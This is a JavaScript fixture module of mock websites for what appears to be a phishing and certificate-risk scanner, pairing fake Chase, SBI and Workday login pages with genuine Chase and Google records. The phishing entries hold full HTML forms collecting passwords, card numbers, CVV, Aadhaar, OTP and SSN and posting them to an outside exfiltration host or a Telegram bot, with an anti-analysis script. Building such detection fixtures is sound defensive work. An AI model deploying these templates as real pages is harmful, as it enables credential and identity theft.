/**
 * Built-in Realistic Mock Targets & Threat Scenarios
 * Enables robust offline testing, benchmark validation, and instant interactive demos
 * for all threat categories and trust infrastructure vulnerabilities.
 */

const MOCK_TARGETS = {
  // 1. Phishing: Banking Brand Impersonation (Chase)
  'https://chase-secure-login-portal.xyz/verify': {
    url: 'https://chase-secure-login-portal.xyz/verify',
    domain: 'chase-secure-login-portal.xyz',
    statusCode: 200,
    headers: {
      'server': 'nginx/1.14.0 (Ubuntu)',
      'x-powered-by': 'PHP/7.2.24',
      'content-type': 'text/html; charset=UTF-8'
      // Intentionally missing all security headers (CSP, HSTS, X-Frame-Options)
    },
    html: `
      <!DOCTYPE html>
      <html>
      <head>
        <title>JPMorgan Chase Online Banking - Security Verification</title>
      </head>
      <body>
        <div class="header"><img src="/logo-chase.png" alt="Chase Bank"></div>
        <div class="content">
          <h2>Security Alert: Suspicious Activity Detected</h2>
          <p>Your account will be deactivated within 24 hours unless you confirm your identity.</p>
          <form action="https://exfil-node-collect.top/submit" method="POST">
            <input type="text" name="username" placeholder="User ID">
            <input type="password" name="password" placeholder="Password">
            <input type="text" name="card_number" placeholder="Debit Card Number">
            <input type="password" name="cvv" placeholder="3-Digit Security Code">
            <button type="submit">Verify Identity Now</button>
          </form>
        </div>
        <script>
          // Anti-analysis: disable context menu
          document.addEventListener('contextmenu', e => e.preventDefault());
        </script>
      </body>
      </html>
    `,
    cert: {
      hasCert: true,
      subject: 'CN=chase-secure-login-portal.xyz',
      issuer: 'CN=R3, O=Let\'s Encrypt, C=US',
      valid_from: new Date(Date.now() - 3600000 * 2).toUTCString(), // 2 hours old!
      valid_to: new Date(Date.now() + 86400000 * 89).toUTCString(),
      bits: 2048,
      exponent: '0x10001',
      subjectaltname: 'DNS:chase-secure-login-portal.xyz, DNS:www.chase-secure-login-portal.xyz',
      sigalg: 'sha256WithRSAEncryption',
      hasSCTs: true
    },
    dns: {
      hasA: true,
      ipv4Addresses: ['194.38.20.14'],
      hasMx: false,
      hasSpf: false,
      hasDmarc: false,
      dmarcPolicy: 'none',
      hasCaa: false,
      emailSpoofingProtection: 'VULNERABLE_TO_SPOOFING',
      caaProtection: 'UNPROTECTED_CAA'
    }
  },

  // 2. Phishing: Indian Banking & Government KYC Fraud (SBI with Cyrillic homoglyph)
  'https://onlinesbi-kyc-pan-update.top/login.html': {
    url: 'https://onlinesbi-kyc-pan-update.top/login.html',
    domain: 'onlinesbi-kyc-pan-update.top',
    statusCode: 200,
    headers: {
      'server': 'Apache/2.4.29',
      'content-type': 'text/html; charset=UTF-8'
    },
    html: `
      <!DOCTYPE html>
      <html>
      <head>
        <title>State Bank of India - Mandatory PAN Card & KYC Linking</title>
      </head>
      <body>
        <div class="sbi-box">
          <img src="/yono_sbi.png">
          <h3>Dear Customer, KYC Expired! Pan Card Locked</h3>
          <p>Action required immediately to avoid account suspension.</p>
          <form action="https://api.telegram.org/bot6128731:AAEk/sendMessage" method="POST">
            <input type="text" name="sbi_username" placeholder="NetBanking Username">
            <input type="password" name="password" placeholder="Profile Password">
            <input type="text" name="pan_card" placeholder="10-digit PAN Number">
            <input type="text" name="aadhaar" placeholder="12-digit Aadhaar Card Number">
            <input type="text" name="otp" placeholder="Enter High Security OTP">
            <button type="submit">Submit KYC Verification</button>
          </form>
        </div>
      </body>
      </html>
    `,
    cert: {
      hasCert: true,
      subject: 'CN=onlinesbi-kyc-pan-update.top',
      issuer: 'CN=ZeroSSL RSA Domain Secure Site CA, O=ZeroSSL, C=AT',
      valid_from: new Date(Date.now() - 3600000 * 5).toUTCString(), // 5 hours old
      valid_to: new Date(Date.now() + 86400000 * 89).toUTCString(),
      bits: 2048,
      exponent: '0x10001',
      subjectaltname: 'DNS:onlinesbi-kyc-pan-update.top',
      sigalg: 'sha256WithRSAEncryption',
      hasSCTs: true
    },
    dns: {
      hasA: true,
      ipv4Addresses: ['185.220.101.5'],
      hasMx: false,
      hasSpf: false,
      hasDmarc: false,
      dmarcPolicy: 'none',
      hasCaa: false,
      emailSpoofingProtection: 'VULNERABLE_TO_SPOOFING',
      caaProtection: 'UNPROTECTED_CAA'
    }
  },

  // 3. Phishing: Fake Recruitment & Advance-Fee Portal (Workday impersonation)
  'https://workday-remote-career-portal.info/apply': {
    url: 'https://workday-remote-career-portal.info/apply',
    domain: 'workday-remote-career-portal.info',
    statusCode: 200,
    headers: {
      'server': 'LiteSpeed',
      'content-type': 'text/html; charset=UTF-8'
    },
    html: `
      <!DOCTYPE html>
      <html>
      <head><title>Workday Portal - Candidate Onboarding Verification</title></head>
      <body>
        <h1>Workday Candidate Verification Portal</h1>
        <p>Congratulations on your job selection. Submit your SSN, banking details, and background deposit.</p>
        <form action="/api/v1/collect" method="POST">
          <input type="text" name="ssn" placeholder="Social Security Number">
          <input type="password" name="password" placeholder="Workday Candidate Password">
          <input type="text" name="card_number" placeholder="Credit Card for Equipment Deposit">
          <input type="text" name="cvv" placeholder="CVV">
          <button type="submit">Complete Background Screening</button>
        </form>
      </body>
      </html>
    `,
    cert: {
      hasCert: true,
      subject: 'CN=workday-remote-career-portal.info',
      issuer: 'CN=GTS CA 1P5, O=Google Trust Services LLC, C=US',
      valid_from: new Date(Date.now() - 86400000 * 2).toUTCString(),
      valid_to: new Date(Date.now() + 86400000 * 88).toUTCString(),
      bits: 2048,
      exponent: '0x10001',
      subjectaltname: 'DNS:workday-remote-career-portal.info',
      sigalg: 'sha256WithRSAEncryption',
      hasSCTs: true
    },
    dns: {
      hasA: true,
      ipv4Addresses: ['104.21.55.90'],
      hasMx: false,
      hasSpf: false,
      hasDmarc: false,
      dmarcPolicy: 'none',
      hasCaa: false,
      emailSpoofingProtection: 'VULNERABLE_TO_SPOOFING',
      caaProtection: 'UNPROTECTED_CAA'
    }
  },

  // 4. Trust Infrastructure Flaw: eMudhra Incident & Flawed CA Keygen
  'https://suspicious-emudhra-issued-portal.com': {
    url: 'https://suspicious-emudhra-issued-portal.com',
    domain: 'suspicious-emudhra-issued-portal.com',
    statusCode: 200,
    headers: {
      'server': 'Apache',
      'content-type': 'text/html'
    },
    html: `
      <!DOCTYPE html>
      <html>
      <head><title>Secure Banking Gateway</title></head>
      <body>
        <h2>Authentication Gateway</h2>
        <form action="/login" method="POST">
          <input type="text" name="user">
          <input type="password" name="password">
          <button type="submit">Sign In</button>
        </form>
      </body>
      </html>
    `,
    cert: {
      hasCert: true,
      subject: 'CN=suspicious-emudhra-issued-portal.com, O=Compromised Gateway Corp, C=IN',
      issuer: 'CN=eMudhra Sub-CA TLS Server Class 2, O=eMudhra Consumer Services Ltd, C=IN',
      valid_from: new Date(Date.now() - 86400000 * 30).toUTCString(),
      valid_to: new Date(Date.now() + 86400000 * 335).toUTCString(),
      bits: 1024, // Vulnerable weak key length < 2048 bits!
      exponent: '0x03', // Low public exponent e=3!
      // ROCA Infineon pattern modulus mock
      modulus: 'b4a8e235a901842018ea1b0289a0182410842018ea1b0289a0182410842018ea1b0289a0182410842018ea1b0289a0182410842018ea1b0289a0182410842018ea1b0289a0182410',
      subjectaltname: 'DNS:suspicious-emudhra-issued-portal.com',
      sigalg: 'sha1WithRSAEncryption', // Deprecated SHA-1!
      hasSCTs: false // Missing Certificate Transparency SCTs!
    },
    dns: {
      hasA: true,
      ipv4Addresses: ['103.21.244.1'],
      hasMx: true,
      hasSpf: true,
      spfRecord: 'v=spf1 ~all',
      hasDmarc: false,
      dmarcPolicy: 'none',
      hasCaa: false,
      emailSpoofingProtection: 'PARTIAL_MONITORING',
      caaProtection: 'UNPROTECTED_CAA'
    }
  },

  // 5. Genuine Legitimate Banking: JPMorgan Chase Official
  'https://www.chase.com': {
    url: 'https://www.chase.com',
    domain: 'chase.com',
    statusCode: 200,
    headers: {
      'server': 'Protected',
      'content-security-policy': "default-src 'self' https://*.chase.com; script-src 'self' https://*.chase.com 'strict-dynamic'; object-src 'none'; frame-ancestors 'none';",
      'strict-transport-security': 'max-age=31536000; includeSubDomains; preload',
      'x-frame-options': 'DENY',
      'x-content-type-options': 'nosniff',
      'referrer-policy': 'strict-origin-when-cross-origin',
      'permissions-policy': 'camera=(), microphone=(), geolocation=(), payment=()',
      'cross-origin-opener-policy': 'same-origin',
      'cross-origin-resource-policy': 'same-origin',
      'content-type': 'text/html; charset=UTF-8'
    },
    html: `
      <!DOCTYPE html>
      <html>
      <head><title>Credit Card, Mortgage, Banking, Auto | Chase Online Banking</title></head>
      <body>
        <h1>Chase Bank Online Experience</h1>
        <form action="https://www.chase.com/auth/login" method="POST">
          <input type="text" name="usr">
          <input type="password" name="pwd">
          <button type="submit">Sign In</button>
        </form>
      </body>
      </html>
    `,
    cert: {
      hasCert: true,
      subject: 'CN=www.chase.com, O=JPMorgan Chase & Co., L=New York, ST=New York, C=US',
      issuer: 'CN=DigiCert EV RSA CA G2, O=DigiCert Inc, C=US',
      valid_from: new Date(Date.now() - 86400000 * 180).toUTCString(), // 180 days old
      valid_to: new Date(Date.now() + 86400000 * 185).toUTCString(),
      bits: 2048,
      exponent: '0x10001',
      subjectaltname: 'DNS:www.chase.com, DNS:chase.com',
      sigalg: 'sha256WithRSAEncryption',
      hasSCTs: true
    },
    dns: {
      hasA: true,
      ipv4Addresses: ['159.53.64.60'],
      hasMx: true,
      hasSpf: true,
      spfRecord: 'v=spf1 include:_spf.chase.com -all',
      hasDmarc: true,
      dmarcRecord: 'v=DMARC1; p=reject; sp=reject; pct=100; rua=mailto:dmarc-rua@chase.com',
      dmarcPolicy: 'reject',
      hasCaa: true,
      caaRecords: [{ critical: 0, tag: 'issue', value: 'digicert.com' }],
      emailSpoofingProtection: 'STRONG_ENFORCED',
      caaProtection: 'STRICT_CAA_ENFORCED'
    }
  },

  // 6. Genuine Legitimate Tech: Google Official
  'https://www.google.com': {
    url: 'https://www.google.com',
    domain: 'google.com',
    statusCode: 200,
    headers: {
      'server': 'gws',
      'strict-transport-security': 'max-age=31536000',
      'x-frame-options': 'SAMEORIGIN',
      'x-content-type-options': 'nosniff',
      'content-security-policy': "object-src 'none'; base-uri 'self'; report-uri https://csp.withgoogle.com",
      'referrer-policy': 'origin',
      'content-type': 'text/html; charset=UTF-8'
    },
    html: `
      <!DOCTYPE html>
      <html>
      <head><title>Google</title></head>
      <body>
        <center><img src="/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google"></center>
      </body>
      </html>
    `,
    cert: {
      hasCert: true,
      subject: 'CN=*.google.com, O=Google LLC, C=US',
      issuer: 'CN=GTS CA 1C3, O=Google Trust Services LLC, C=US',
      valid_from: new Date(Date.now() - 86400000 * 45).toUTCString(),
      valid_to: new Date(Date.now() + 86400000 * 45).toUTCString(),
      bits: 256,
      asn1Curve: 'prime256v1', // ECC modern curve
      subjectaltname: 'DNS:*.google.com, DNS:google.com',
      sigalg: 'ecdsa-with-SHA256',
      hasSCTs: true
    },
    dns: {
      hasA: true,
      ipv4Addresses: ['142.250.190.46'],
      hasMx: true,
      hasSpf: true,
      spfRecord: 'v=spf1 include:_spf.google.com ~all',
      hasDmarc: true,
      dmarcRecord: 'v=DMARC1; p=reject; rua=mailto:mailauth-reports@google.com',
      dmarcPolicy: 'reject',
      hasCaa: true,
      caaRecords: [{ critical: 0, tag: 'issue', value: 'pki.goog' }],
      emailSpoofingProtection: 'STRONG_ENFORCED',
      caaProtection: 'STRICT_CAA_ENFORCED'
    }
  }
};

/**
 * Returns mock data if target URL matches, otherwise null
 */
function getMockTarget(targetUrl) {
  if (!targetUrl) return null;

  // Try exact match
  if (MOCK_TARGETS[targetUrl]) {
    return MOCK_TARGETS[targetUrl];
  }

  // Try matching domain
  for (const key in MOCK_TARGETS) {
    if (targetUrl.includes(MOCK_TARGETS[key].domain)) {
      return MOCK_TARGETS[key];
    }
  }

  return null;
}

module.exports = {
  MOCK_TARGETS,
  getMockTarget
};
